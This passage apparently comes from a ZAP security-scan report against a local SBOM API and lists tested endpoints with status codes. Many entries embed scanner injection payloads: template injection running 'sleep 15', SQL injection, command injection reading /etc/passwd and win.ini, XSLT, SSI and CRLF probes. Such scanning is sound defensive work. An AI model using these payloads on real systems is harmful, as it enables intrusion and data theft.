  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/analyze/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analyze/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/analyze/stream
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analyze/stream ()({sources:[]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `429`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/analyze/stream/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analyze/stream/ ()({sources:[]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `429`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/components/reprocess
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/components/reprocess`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/components/reprocess/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/components/reprocess/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/convert/cyclonedx
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/convert/cyclonedx`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/convert/cyclonedx%3Fuser_id=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/convert/cyclonedx (user_id)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/convert/cyclonedx/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/convert/cyclonedx/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/edit
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/edit ()({"metadata":{},"components":[{"bom_ref":"John Doe","name":ZAP,"version":"John Doe","supplier":"John Doe","license":"John Doe","hashes":"John Doe","lifecycle":{}}],"change_summary":"Manual edit via UI"})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/edit%3Fuser_id=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/edit (user_id)({"metadata":{},"components":[{"bom_ref":"John Doe","name":ZAP,"version":"John Doe","supplier":"John Doe","license":"John Doe","hashes":"John Doe","lifecycle":{}}],"change_summary":"Manual edit via UI"})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/edit/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/edit/ ()({"metadata":{},"components":[{"bom_ref":"John Doe","name":ZAP,"version":"John Doe","supplier":"John Doe","license":"John Doe","hashes":"John Doe","lifecycle":{}}],"change_summary":"Manual edit via UI"})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle/refresh
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle/refresh`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle/refresh%3Fforce=true
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle/refresh (force)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle/refresh%3Fforce=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle/refresh (force)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle/refresh/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle/refresh/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/normalize-deduplicate
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/normalize-deduplicate`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/normalize-deduplicate%3Fforce=false
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/normalize-deduplicate (force)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/normalize-deduplicate%3Fforce=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/normalize-deduplicate (force)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/normalize-deduplicate/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/normalize-deduplicate/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/restore
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/restore`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/restore/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/restore/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/restore/10
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/restore/10`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/restore/10%3Fuser_id=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/restore/10 (user_id)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/restore/10/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/restore/10/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/revalidate
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/revalidate`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/revalidate/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/revalidate/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/schedule
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/schedule ()({cadence,cron_expression,day_of_week,day_of_month,hour_utc,timezone,enabled,min_gap_minutes,modified_by})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/schedule/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/schedule/ ()({cadence,cron_expression,day_of_week,day_of_month,hour_utc,timezone,enabled,min_gap_minutes,modified_by})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("#set($engine=\"\")\n#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"sleep 15\"))\n#set($null=$proc.waitFor())\n${null}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("#{%x(sleep 15)}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("#{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\\")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("${__import__(\"subprocess\").check_output(\"sleep 15\", shell=True)}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("'(")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("+response.write({0}*{1})+")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("5;URL='https://6178435829869361747.owasp.org'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("5;URL='https://6178435829869361747.owasp.org/?John Doe'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("6178435829869361747.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()(";")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()(";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("<!--")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("<!--#EXEC cmd=\"dir \\\"-->")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("<!--#EXEC cmd=\"ls /\"-->")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("<")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"sleep 15\") }")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("<%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("<%=%x(sleep 15)%>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("<xsl:value-of select=\"document('http://host.docker.internal:22')\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("<xsl:value-of select=\"php:function('exec','erroneous_command 2>&amp;1')\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("<xsl:value-of select=\"system-property('xsl:vendor')\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("<xsl:value-of select=\"system-property('xsl:vendor')\"/><!--")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("<xsl:variable name=\"rtobject\" select=\"runtime:getRuntime()\"/>\n<xsl:variable name=\"process\" select=\"runtime:exec($rtobject,'erroneous_command')\"/>\n<xsl:variable name=\"waiting\" select=\"process:waitFor($process)\"/>\n<xsl:value-of select=\"$process\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe AND 1=1 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe AND 1=2 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe OR 1=1 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe&cat /etc/passwd&")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe&type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe' AND '1'='1' -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe' AND '1'='2' -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe' OR '1'='1' -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe' UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe'&cat /etc/passwd&'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe'&type %SYSTEMROOT%\\win.ini&'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe'(")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe') UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe';cat /etc/passwd;'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe';get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe'|type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe) UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe;")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe;cat /etc/passwd;")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe;get-help #")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe;get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe\" UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe\"&cat /etc/passwd&\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe\"&type %SYSTEMROOT%\\win.ini&\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe\";cat /etc/passwd;\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe\";get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe\"|type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("John Doe|type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("Set-cookie: Tamper=9eaaa001-7a45-4bb0-8293-38508a077f34")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("URL='http://6178435829869361747.owasp.org'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("ZAP %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("ZAP%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("\"'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("\"+response.write(334,949*260,900)+\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("\"/><xsl:value-of select=\"system-property('xsl:vendor')\"/><!--")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var=\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("\"><!--#EXEC cmd=\"dir \\\"--><")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("\"><!--#EXEC cmd=\"ls /\"--><")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("]]>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("any?\nSet-cookie: Tamper=9eaaa001-7a45-4bb0-8293-38508a077f34")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("any?\r\nSet-cookie: Tamper=9eaaa001-7a45-4bb0-8293-38508a077f34")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("any?\r\nSet-cookie: Tamper=9eaaa001-7a45-4bb0-8293-38508a077f34\r\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("any\nSet-cookie: Tamper=9eaaa001-7a45-4bb0-8293-38508a077f34")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("any\r\nSet-cookie: Tamper=9eaaa001-7a45-4bb0-8293-38508a077f34")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("any\r\nSet-cookie: Tamper=9eaaa001-7a45-4bb0-8293-38508a077f34\r\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
